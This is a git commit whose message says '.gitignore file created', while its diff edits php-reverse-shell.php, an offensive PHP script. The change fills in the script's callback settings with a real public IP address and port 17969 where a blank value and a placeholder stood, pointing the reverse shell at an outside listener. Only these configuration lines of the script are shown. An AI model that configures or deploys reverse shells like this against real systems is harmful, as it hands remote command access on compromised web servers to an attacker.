da05e8eb1733dba6bfe82d64296eb507a525275b
th3g3ntl3man <th3g3ntl3man@kali>
2023-11-28 14:59:38 -0500

    .gitignore file created

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '';  // CHANGE THIS
-$port = 6969;       // CHANGE THIS
+$ip = '3.142.167.54';  // CHANGE THIS
+$port = 17969;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
